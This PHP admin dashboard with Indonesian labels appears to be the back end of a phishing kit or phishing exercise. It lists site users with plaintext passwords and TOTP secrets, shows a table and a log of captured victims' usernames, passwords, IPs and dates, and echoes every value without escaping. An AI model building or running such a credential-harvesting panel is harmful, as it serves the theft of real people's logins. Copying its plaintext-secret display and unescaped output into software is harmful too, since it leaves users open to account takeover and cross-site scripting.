<?php 
	session_start();

	if($_SESSION['level']==""){
		header("location:../../index.php");
	}elseif ($_SESSION['level']!="admin" || $_SESSION['level']!="admin"){
		header("location:halaman_user.php");
	}

?>

<!DOCTYPE html>
<html>
<head>
	<title>Halaman admin </title>

	<style>
	div.ex1 {
		  /*background-color: gray;*/
		  width: 700px;
		  height: 500px;
		  overflow: scroll;
	}
</style>
</head>
<body>

	<h1>Halaman Admin</h1>

	<p>Halo <b><?php echo $_SESSION['username']; ?></b> anda login sebagai grup <b><?php echo $_SESSION['level']; ?></b><br>
	<a href="logout.php">LOGOUT</a>

	<br/>
	<br/>
<hr><hr>



<?php 
	if(isset($_GET['pesan'])){
		$pesan = $_GET['pesan'];
		if($pesan == "input"){
			echo "Data berhasil di input.";
		}else if($pesan == "update"){
			echo "Data berhasil di update.";
		}else if($pesan == "hapus"){
			echo "Data berhasil di hapus.";
		}
	}
	?>
	<br/>
	<a class="tombol" href="insert.php">+ Tambah User Baru</a><br>
	<a class="tombol" href="generateTOTP.php">+ Ganti Token TOTP untuk user [<?php echo $_SESSION['username']; ?>]</a>
 
	<h3>Data user ADMIN</h3>
	<table border="1" class="table">
		<tr>
			<th>id</th>
			<th>Username</th>
			<th>Password</th>
            <th>level</th>
			<th>TOTP</th>
			<th>Opsi</th>	
		</tr>

		<?php 
		include '../DB.php';

		$data = mysqli_query($conn,"SELECT * FROM user");
		while($d = mysqli_fetch_array($data)){
			?>
			<tr>
				<td><?php echo $d['id']; ?></td>
				<td><?php echo $d['username']; ?></td>
				<td><?php echo $d['password']; ?></td>
				<td><?php echo $d['level']; ?></td>
				<td><?php echo $d['totp']; ?></td>
				<td>
					<a href="update.php?id=<?php echo $d['id'];?>">EDIT</a>
					<a href="hapus.php?id=<?php echo $d['id'];?>&db=user">HAPUS</a>
				</td>
			</tr>
			<?php 
		}
		?>

	</table>





	<h3>Data PHISHING</h3>
	<table border="1" class="table">
		<tr>
			<th>id</th>
			<th>Username</th>
			<th>Password</th>
			<th>IP</th>
            <th>Date</th>
            <th>Opsi</th>	
		</tr>

		<?php 
		include '../DB.php';

		$data = mysqli_query($conn,"SELECT * FROM phishing");
		while($d = mysqli_fetch_array($data)){
			?>
			<tr>
				<td><?php echo $d['id']; ?></td>
				<td><?php echo $d['username']; ?></td>
				<td><?php echo $d['password']; ?></td>
				<td><?php echo $d['ip']; ?></td>
				<td><?php echo $d['date']; ?></td>
				<td>
					<a href="hapus.php?id=<?php echo $d['id'];?>&db=phishing">HAPUS</a>
				</td>
			</tr>
			<?php 
		}
		?>

	</table>

	<h3>AUTH LOG FILE</h3>

	<div class="ex1">
	<?php
		$tabChar = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
		$myfile = fopen("../log.txt", "r") or die("Unable to open file!");
			while(!feof($myfile)) {
				$line = fgets($myfile);
				$parsing = str_replace("\t",$tabChar,$line);
				echo $parsing."<br>";
			}
		fclose($myfile);
	?>
	</div>

	<h3>PHISHING LOG FILE</h3>

        <div class="ex1">
        <?php
                $tabChar = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
                $myfile = fopen("../../../scripts/logs.txt", "r") or die("Unable");
                        while(!feof($myfile)) {
                                $line = fgets($myfile);
                                $parsing = str_replace("\t",$tabChar,$line);
                                echo $parsing."<br>";
                        }
                fclose($myfile);
        ?>
        </div>

</body>
</html>
